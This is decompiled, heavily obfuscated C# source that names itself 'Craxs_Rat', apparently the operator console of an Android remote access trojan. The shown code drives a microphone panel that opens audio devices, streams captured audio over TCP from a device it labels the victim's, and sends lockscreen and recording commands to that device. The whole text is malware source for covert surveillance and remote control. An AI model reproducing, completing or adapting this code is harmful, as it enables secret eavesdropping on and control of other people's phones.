            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classClient.SendMessage(new object[4]
            {
              (object) ((Ports._Closure\u0024__) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0035F51723B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003342B1252 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030A5E051F + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Conversions.ToString(reso.HzInt(this.OutHZ.Text)) + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Accept.MicwaveOutByte + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + ((Data) ((Ports._Closure\u0024__) this).classClient).ClientRemoteAddress + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u0036B3B0147),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031B4B6953),
              (object) ((Ports._Closure\u0024__) this).classClient
            });
            num1 = 1666118467;
            continue;
          case 2:
            goto label_8;
          case 3:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classClient.SendMessage(new object[4]
            {
              (object) ((Ports._Closure\u0024__) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient6 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031B4B6953),
              (object) ((Ports._Closure\u0024__) this).classClient
            });
            num1 = (int) num3 * -1383078841 ^ -1311710797;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated field
            strArray = ((Data) ((Ports._Closure\u0024__) this).classClient).Keys.Split(':');
            num1 = (int) num3 * -954811676 ^ -1869077378;
            continue;
          case 5:
            int selectedIndex = this.OutBoxSource.SelectedIndex;
            // ISSUE: reference to a compiler-generated field
            int num4 = ((Data) ((Ports._Closure\u0024__) this).classClient).Keys.Split(':')[7][1] != '0' ? 1184717477 : (num4 = 2085872525);
            num1 = num4 ^ (int) num3 * 1277449879;
            continue;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    public void Out_Stop()
    {
      // ISSUE: reference to a compiler-generated field
      if (((Ports._Closure\u0024__) this).classWaveOut == null)
        goto label_4;
label_1:
      int num1 = 327082080;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~(588946455 - 2113950283) - ((num2 - (~(256177394 * -1465601511 + (-119139507 - 1248285429) + --816994779) - -19117722 * -1285558757)) * -925530341 - -1265428930))) % 7U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classWaveOut.Close(((Ports._Closure\u0024__) this).ClientWaveOut);
            num1 = (int) num3 * -1054265697 ^ 378877839;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D8) ((Ports._Closure\u0024__) this).classWaveOut).qit = true;
            num1 = (int) num3 * -1477470224 ^ 1057745108;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).waveOut.Stop();
            num1 = (int) num3 * -77770319 ^ -2007365084;
            continue;
          case 3:
            goto label_4;
          case 4:
            goto label_1;
          case 5:
            goto label_3;
          case 6:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).waveOut = (WaveOut) null;
            num1 = -452798676;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_4:
      // ISSUE: reference to a compiler-generated field
      num1 = ((Ports._Closure\u0024__) this).waveOut == null ? 300838851 : (num1 = -1089183722);
      goto label_2;
    }

    public bool In_Start(int idDevice)
    {
      this.WaveIn = new WaveIn(idDevice);
label_1:
      int num1 = -657798310;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 ^ ~~--(222116163 * 1912699705)) * 1682556365)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Bgworker.RunWorkerAsync();
            int num3 = !Operators.ConditionalCompareObjectEqual(this.bIN.Tag, (object) 1, false) ? 1800931070 : (num3 = 697498065);
            num1 = num3 ^ (int) num2 * 1039548168;
            continue;
          case 3:
            this.bIN.Text = EXGuarder.\u0035E000403;
            num1 = (int) num2 * 1723354188 ^ 208108922;
            continue;
          case 4:
            int num4 = this.Bgworker.IsBusy ? -605033506 : (num4 = -866909962);
            num1 = num4 ^ (int) num2 * 1243347376;
            continue;
          case 5:
            this.bIN.Tag = (object) 2;
            num1 = (int) num2 * -1014496764 ^ -841747105;
            continue;
          case 6:
            this.Bgworker = new BackgroundWorker();
            num1 = (int) num2 * 1014421827 ^ -2020836564;
            continue;
          case 7:
            // ISSUE: reference to a compiler-generated field
            this.WaveIn.Open(reso.FormatWave(((Ports._Closure\u0024__228\u002D1) this).rateInput));
            this.WaveIn.Start();
            num1 = (int) num2 * -1049013250 ^ 1073304812;
            continue;
          case 8:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).DoCase = true;
            num1 = (int) num2 * 945395643 ^ -1223781194;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return true;
    }

    private void In_Stop()
    {
      // ISSUE: reference to a compiler-generated field
      ((Ports._Closure\u0024__) this).DoCase = false;
label_1:
      int num1 = -216880192;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -----(num1 - ~(-(-2049368317 * -760204035) - ((~-1657801556 ^ 1736450558) + (-566953948 ^ 446619483 * -1183298374))))) % 11U)
        {
          case 0:
            goto label_3;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classWaveIn.Close(((Ports._Closure\u0024__) this).ClientWaveIn);
            num1 = (int) num2 * -1650452237 ^ -2145388265;
            continue;
          case 2:
            goto label_1;
          case 3:
            this.Bgworker.Dispose();
            num1 = (int) num2 * 519979894 ^ 415797759;
            continue;
          case 4:
            int num3 = this.Bgworker == null ? 104370519 : (num3 = -1109117062);
            num1 = num3 ^ (int) num2 * -526575034;
            continue;
          case 5:
            int num4 = !this.Bgworker.IsBusy ? -526563531 : (num4 = -664542168);
            num1 = num4 ^ (int) num2 * 399961388;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).bytes.Clear();
            num1 = -246328869;
            continue;
          case 7:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D8) ((Ports._Closure\u0024__) this).classWaveIn).qit = true;
            num1 = (int) num2 * -942271659 ^ 543626286;
            continue;
          case 8:
            int num5;
            // ISSUE: reference to a compiler-generated field
            num1 = num5 = ((Ports._Closure\u0024__) this).waveOut == null ? 828225797 : (num5 = 717086748);
            continue;
          case 9:
            // ISSUE: reference to a compiler-generated field
            int num6 = ((Ports._Closure\u0024__) this).classWaveIn == null ? -205366330 : (num6 = -585606319);
            num1 = num6 ^ (int) num2 * -1789710937;
            continue;
          case 10:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).waveOut.Stop();
            num1 = (int) num2 * 1641665001 ^ 855128492;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    private void LoadDEVMicrophone()
    {
      IEnumerator enumerator = (IEnumerator) null;
      try
      {
        enumerator = (IEnumerator) WaveIn.Devices.GetEnumerator();
label_2:
        int num1 = 882173998;
        while (true)
        {
          int num2 = num1;
          uint num3;
          WaveInDeviceCaps current;
          string str;
          switch ((num3 = (uint) (((-746617723 * (-664160171 ^ 719107687) ^ -(-966767863 - 867142133)) - ~~num2 - --24810148) * -2002737135)) % 9U)
          {
            case 0:
              goto label_2;
            case 1:
              int num4;
              num1 = num4 = enumerator.MoveNext() ? -1993480547 : (num4 = -261361531);
              continue;
            case 2:
              current.Name = current.Name.Replace(EXGuarder.\u00375325762, EXGuarder.\u003204F2B34).Replace(EXGuarder.\u003170D7443, EXGuarder.\u003204F2B34);
              num1 = (int) num3 * 567151766 ^ -1086556350;
              continue;
            case 3:
              int num5 = current.DeviceId == -1 ? 1830837870 : (num5 = 1336623832);
              num1 = num5 ^ (int) num3 * 1134783448;
              continue;
            case 4:
              str = string.Format(EXGuarder.\u00329326F34, (object) current.DeviceId, (object) current.Name);
              num1 = (int) num3 * 1956573065 ^ 2114611085;
              continue;
            case 5:
              this.InBoxSource.Items.Add((object) str);
              num1 = (int) num3 * 369965035 ^ 219140325;
              continue;
            case 6:
              current = (WaveInDeviceCaps) enumerator.Current;
              num1 = 1036451849;
              continue;
            case 7:
              num1 = (int) num3 * 890496170 ^ 831447262;
              continue;
            default:
              goto label_17;
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable)
        {
label_12:
          int num6 = -1421262070;
          while (true)
          {
            int num7 = num6;
            uint num8;
            switch ((num8 = (uint) (((-746617723 * (-664160171 ^ 719107687) ^ -(-966767863 - 867142133)) - ~~num7 - --24810148) * -2002737135)) % 3U)
            {
              case 1:
                ((IDisposable) enumerator).Dispose();
                num6 = (int) num8 * -1352482488 ^ 213444364;
                continue;
              case 2:
                goto label_12;
              default:
                goto label_16;
            }
          }
        }
label_16:;
      }
label_17:
      if (this.InBoxSource.Items.Count != 0)
        goto label_24;
label_18:
      int num9 = 384592106;
label_19:
      while (true)
      {
        int num10 = num9;
        uint num11;
        switch ((num11 = (uint) (((-746617723 * (-664160171 ^ 719107687) ^ -(-966767863 - 867142133)) - ~~num10 - --24810148) * -2002737135)) % 6U)
        {
          case 0:
            goto label_20;
          case 1:
            goto label_24;
          case 2:
            this.DeviceSOurVictim.SelectedIndex = 0;
            num9 = (int) num11 * -622284240 ^ 1075613041;
            continue;
          case 3:
            this.inHZ.SelectedIndex = 0;
            num9 = (int) num11 * -437956521 ^ 1279900115;
            continue;
          case 4:
            this.Panel2.Visible = false;
            num9 = (int) num11 * 1570256534 ^ -1939949052;
            continue;
          case 5:
            goto label_18;
          default:
            goto label_14;
        }
      }
label_20:
      return;
label_14:
      return;
label_24:
      this.InBoxSource.SelectedIndex = 0;
      num9 = -1438105840;
      goto label_19;
    }

    private void AppendByteToDisk(string FilepathToAppendTo, ref byte[] Content)
    {
      FileStream fileStream = new FileStream(FilepathToAppendTo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
      fileStream.Write(Content, 0, Content.Length);
label_1:
      int num1 = 1239109284;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-num1 + -(-1381428539 - -570266023 - (-830640773 ^ 1737511214)) * 307659743 ^ ~-1268454610)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            fileStream.Close();
            num1 = (int) num2 * 163764675 ^ 1237830989;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void OK_DataReady(object sender, DataReadyEventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      ((Ports._Closure\u0024__) this).bytes.Add(e.Data);
    }

    private void bIN_Click(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      if (((Ports._Closure\u0024__) this).classClient == null)
        return;
label_1:
      int num1 = -513706689;
      while (true)
      {
        int num2 = num1;
        uint num3;
        object[] ParametersObjects;
        int selectedIndex;
        string[] strArray;
        switch ((num3 = (uint) ~((858099975 - -1074944850 ^ -1867635759 - 1433094980 ^ 2107365446 + 244801281 ^ -717861492) - (~num2 - (~-403459668 + (1637419445 - 1556893014) - -961386891 * 655772616 - (133066243 ^ (-163280523 ^ 1427006220) * -1815985953))))) % 16U)
        {
          case 0:
            goto label_18;
          case 1:
            this.bIN.Text = EXGuarder.\u00302264F56;
            this.bIN.Tag = (object) 0;
            num1 = (int) num3 * -561095775 ^ -275703160;
            continue;
          case 2:
            selectedIndex = this.DeviceSOurVictim.SelectedIndex;
            num1 = (int) num3 * -1948677372 ^ -1667598599;
            continue;
          case 3:
            this.bIN.Text = EXGuarder.\u00302264F56;
            this.bIN.Tag = (object) 0;
            num1 = (int) num3 * 1056229685 ^ 1360137389;
            continue;
          case 4:
            this.bIN.Tag = (object) 1;
            this.bIN.Text = EXGuarder.\u0034D045600;
            num1 = (int) num3 * -2139532235 ^ -1150124211;
            continue;
          case 5:
            this.In_Stop();
            num1 = (int) num3 * -1333865424 ^ 1359028248;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * 918772816 ^ -532006859;
            continue;
          case 7:
            num1 = (int) num3 * -1345186072 ^ -742490143;
            continue;
          case 8:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Ports._Closure\u0024__) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0031B03300D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033A102323 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034F225313 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + ((Data) ((Ports._Closure\u0024__) this).classClient).ClientRemoteAddress + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Craxs_Rat.sockets.Client.MicwaveinByte + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + selectedIndex.ToString() + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Conversions.ToString(reso.HzInt(this.inHZ.Text))),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0036062546A),
              (object) ((Ports._Closure\u0024__) this).classClient
            };
            num1 = (int) num3 * -2061058441 ^ -2143918165;
            continue;
          case 9:
            this.In_Stop();
            num1 = (int) num3 * 1943041516 ^ 1554593866;
            continue;
          case 10:
            int num4 = !Operators.ConditionalCompareObjectEqual(this.bIN.Tag, (object) 0, false) ? -1991081993 : (num4 = -949864335);
            num1 = num4 ^ (int) num3 * -1455536959;
            continue;
          case 11:
            // ISSUE: reference to a compiler-generated field
            strArray = ((Data) ((Ports._Closure\u0024__) this).classClient).Keys.Split(':');
            num1 = (int) num3 * -114172216 ^ -595741137;
            continue;
          case 12:
            int num5;
            num1 = num5 = !Operators.ConditionalCompareObjectEqual(this.bIN.Tag, (object) 1, false) ? -1296298228 : (num5 = -884905680);
            continue;
          case 13:
            int num6;
            num1 = num6 = !Operators.ConditionalCompareObjectEqual(this.bIN.Tag, (object) 2, false) ? -659535559 : (num6 = -638833292);
            continue;
          case 14:
            this.In_Stop();
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).bytes.Clear();
            num1 = (int) num3 * -1911962717 ^ 566490724;
            continue;
          case 15:
            goto label_1;
          default:
            goto label_19;
        }
      }
label_18:
      return;
label_19:;
    }

    private void Worker_DoWork(object sender, DoWorkEventArgs e)
    {
label_19:
      // ISSUE: reference to a compiler-generated field
      if (((Ports._Closure\u0024__) this).bytes.Count > 0)
        goto label_20;
label_5:
      Thread.Sleep(1);
      int num1 = 1729612908;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-~586188124 + (1129814455 ^ 343297290) - (num2 ^ ~~(~1948195638 * 854251177 - (~491910910 ^ ~801959092))) * 696726413)) % 5U)
        {
          case 0:
            goto label_18;
          case 2:
            num1 = 835307710;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            if (!((Ports._Closure\u0024__) this).DoCase)
            {
              num1 = (int) num3 * -1533826770 ^ -853165007;
              continue;
            }
            goto label_19;
          case 4:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_18:
      return;
label_6:
      // ISSUE: reference to a compiler-generated field
      byte[] buffer = ((Ports._Closure\u0024__) this).bytes[0];
      try
      {
        // ISSUE: reference to a compiler-generated field
        if (((Ports._Closure\u0024__) this).ClientWaveIn.Client.Connected)
        {
label_8:
          int num4 = -2006462011;
          while (true)
          {
            int num5 = num4;
            uint num6;
            switch ((num6 = (uint) (-~586188124 + (1129814455 ^ 343297290) - (num5 ^ ~~(~1948195638 * 854251177 - (~491910910 ^ ~801959092))) * 696726413)) % 5U)
            {
              case 0:
                goto label_8;
              case 2:
                // ISSUE: reference to a compiler-generated field
                ((Ports._Closure\u0024__) this).ClientWaveIn.Client.Poll(RegistryHandler.Microseconds, SelectMode.SelectWrite);
                num4 = (int) num6 * -116292374 ^ -1066100470;
                continue;
              case 3:
                // ISSUE: variable of a reference type
                long& local;
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: explicit reference operation
                long num7 = checked (^(local = ref ((Data) ((Data._Closure\u0024__) ((Ports._Closure\u0024__) this).classClient).MyServer).BytesSent) + (long) buffer.Length);
                local = num7;
                num4 = (int) num6 * -1252981362 ^ 960429854;
                continue;
              case 4:
                // ISSUE: reference to a compiler-generated field
                ((Ports._Closure\u0024__) this).ClientWaveIn.Client.SendBufferSize = checked (buffer.Length * 15);
                // ISSUE: reference to a compiler-generated field
                ((Ports._Closure\u0024__) this).ClientWaveIn.GetStream().Write(buffer, 0, buffer.Length);
                num4 = (int) num6 * -2106144774 ^ -433917674;
                continue;
              default:
                goto label_15;
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        return;
      }
label_15:
      // ISSUE: reference to a compiler-generated field
      if (!((Ports._Closure\u0024__) this).DoCase)
        goto label_5;
label_16:
      int num8 = -778906785;
label_17:
      while (true)
      {
        int num9 = num8;
        uint num10;
        switch ((num10 = (uint) (-~586188124 + (1129814455 ^ 343297290) - (num9 ^ ~~(~1948195638 * 854251177 - (~491910910 ^ ~801959092))) * 696726413)) % 6U)
        {
          case 0:
            goto label_19;
          case 1:
            goto label_5;
          case 2:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).bytes.RemoveAt(0);
            num8 = (int) num10 * -1452855572 ^ 1294652126;
            continue;
          case 3:
            goto label_6;
          case 4:
            goto label_21;
          case 5:
            goto label_16;
          default:
            goto label_13;
        }
      }
label_21:
      return;
label_13:
      return;
label_20:
      num8 = -1643684892;
      goto label_17;
    }

    public virtual WaveIn WaveIn
    {
      get => ((Ports._Closure\u0024__) this).WaveIin;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler<DataReadyEventArgs> eventHandler = new EventHandler<DataReadyEventArgs>(this.OK_DataReady);
label_1:
        int num1 = 1869320274;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -((~(1393315287 * -581348385 - -~687603161 * -1507572273 - num2 * -591299785) ^ -1039896848) * -1199241015)) % 7U)
          {
            case 0:
              int num4 = ((Ports._Closure\u0024__) this).WaveIin == null ? 1024958333 : (num4 = 1589783011);
              num1 = num4 ^ (int) num3 * -1300804273;
              continue;
            case 1:
              ((Ports._Closure\u0024__) this).WaveIin = value;
              num1 = -1308571778;
              continue;
            case 2:
              ((Ports._Closure\u0024__) this).WaveIin.DataReady -= eventHandler;
              num1 = (int) num3 * -1734703842 ^ -676951884;
              continue;
            case 3:
              int num5 = ((Ports._Closure\u0024__) this).WaveIin == null ? 1005487972 : (num5 = -1795263001);
              num1 = num5 ^ (int) num3 * 339760129;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            case 6:
              ((Ports._Closure\u0024__) this).WaveIin.DataReady += eventHandler;
              num1 = (int) num3 * -651391941 ^ 956511736;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    private void InBoxSource_SelectedIndexChanged(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      ((Ports._Closure\u0024__228\u002D0) this).MDeviceId = Conversions.ToInteger(Regex.Match(this.InBoxSource.SelectedItem.ToString(), EXGuarder.\u0032B156139 + Regex.Escape(EXGuarder.\u0031A522529) + EXGuarder.\u003416C344A + Regex.Escape(EXGuarder.\u0035F53411C) + EXGuarder.\u0035F53411C, RegexOptions.IgnoreCase).Value.Trim());
    }

    private void OutBoxSource_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void Microphone_FormClosing(object sender, FormClosingEventArgs e)
    {
    }

    private void Button1_Click_1(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.Button1.Tag.ToString(), EXGuarder.\u00312464275, false) != 0)
        goto label_16;
label_1:
      int num1 = 5562636;
label_2:
      TcpClient client1;
      object[] ParametersObjects1;
      TcpClient client2;
      object[] ParametersObjects2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-((num1 ^ ~(1818275374 - 1285999779 - 201043230 + (-1911654887 - -1690326588 ^ ~-1185306819) ^ ~(260081067 * -349754695) - (--1115860217 ^ -1612827187 - 2013438213))) - ((-1457262198 - 718817386) * 574142617 + (~-687979551 - (1150370891 - -99336154))) * 1019357821) ^ 690979929 * (851570285 - 248615367)) + (849070310 - 112698659) - -1870213215)) % 17U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects2 = new object[4]
            {
              (object) client2,
              (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0036631566B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00341393B06 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00341393B06 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Ports._Closure\u0024__) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00310575F5A),
              (object) ((Ports._Closure\u0024__) this).classClient
            };
            num1 = (int) num2 * 1741292021 ^ -402678857;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classClient.SendMessage(ParametersObjects2);
            this.Button1.Text = EXGuarder.\u0036C17223F;
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__229\u002D0) this).isrecording = (object) false;
            num1 = (int) num2 * 1576130684 ^ 787226264;
            continue;
          case 2:
            this.DrakeUILampLED1.Blink = false;
            num1 = (int) num2 * -289273000 ^ -1795232754;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classClient.SendMessage(ParametersObjects1);
            num1 = (int) num2 * -1641208955 ^ -149384948;
            continue;
          case 4:
            this.DrakeUILampLED1.Blink = true;
            num1 = (int) num2 * 155033501 ^ -1970563381;
            continue;
          case 5:
            goto label_16;
          case 6:
            goto label_1;
          case 7:
            this.Button1.Text = EXGuarder.\u0030F733862;
            // ISSUE: reference to a compiler-generated method
            AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u003563C451F);
            num1 = (int) num2 * -1756341329 ^ 1702652605;
            continue;
          case 8:
            // ISSUE: reference to a compiler-generated field
            int num3 = ((Ports._Closure\u0024__) this).classClient == null ? -192811942 : (num3 = -1749084607);
            num1 = num3 ^ (int) num2 * -2044747852;
            continue;
          case 9:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects1 = new object[4]
            {
              (object) client1,
              (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00370593460 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00341393B06 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00341393B06 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Ports._Closure\u0024__) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00310575F5A),
              (object) ((Ports._Closure\u0024__) this).classClient
            };
            num1 = (int) num2 * -665461136 ^ -1620077159;
            continue;
          case 10:
            this.Button1.Tag = (object) EXGuarder.\u00300363939;
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            client1 = ((Data._Closure\u0024__) ((Ports._Closure\u0024__) this).classClient).myClient;
            num1 = (int) num2 * -139456187 ^ 2075678973;
            continue;
          case 11:
            goto label_3;
          case 12:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__229\u002D0) this).isrecording = (object) true;
            this.DrakeUILampLED1.On = true;
            num1 = (int) num2 * 1762580748 ^ -1226096241;
            continue;
          case 13:
            this.Button1.Tag = (object) EXGuarder.\u00312464275;
            num1 = (int) num2 * 1141045439 ^ 1288776278;
            continue;
          case 14:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            client2 = ((Data._Closure\u0024__) ((Ports._Closure\u0024__) this).classClient).myClient;
            num1 = (int) num2 * 2057155711 ^ 1949373069;
            continue;
          case 15:
            num1 = (int) num2 * 1644590315 ^ 787933894;
            continue;
          case 16:
            this.DrakeUILampLED1.On = false;
            num1 = (int) num2 * -1034742977 ^ 889181762;
            continue;
          default:
            goto label_19;
        }
      }
label_3:
      return;
label_19:
      return;
label_16:
      // ISSUE: reference to a compiler-generated field
      num1 = ((Ports._Closure\u0024__) this).classClient == null ? 209811438 : (num1 = -1453853930);
      goto label_2;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -1885309357;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 ^ ~(~(-435687287 * 1318098527 - ~-509364392) ^ ~(1498758658 * 1017183041) - -1702164839)) - (-1286993113 * --9632654 - (-1984407380 - (2107259277 ^ -1302818673)) - (-1582976705 - 1029199856 - (-2127185564 - 1513923244) + -(1240200377 + 932220309))) - (-1687005425 * -1543596734 + 1037077631 ^ 1416851843) + -1079406685 * 1399865093)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              // ISSUE: reference to a compiler-generated field
              int num3 = ((Ports._Closure\u0024__229\u002D1) this).components == null ? -828055866 : (num3 = -1704337125);
              num1 = num3 ^ (int) num2 * 32966795;
              continue;
            case 2:
              // ISSUE: reference to a compiler-generated field
              ((Ports._Closure\u0024__229\u002D1) this).components.Dispose();
              num1 = (int) num2 * 2022065181 ^ 1743575731;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      // ISSUE: reference to a compiler-generated field
      ((Ports._Closure\u0024__229\u002D1) this).components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Ports));
label_1:
      int num1 = 1808200940;
      while (true)
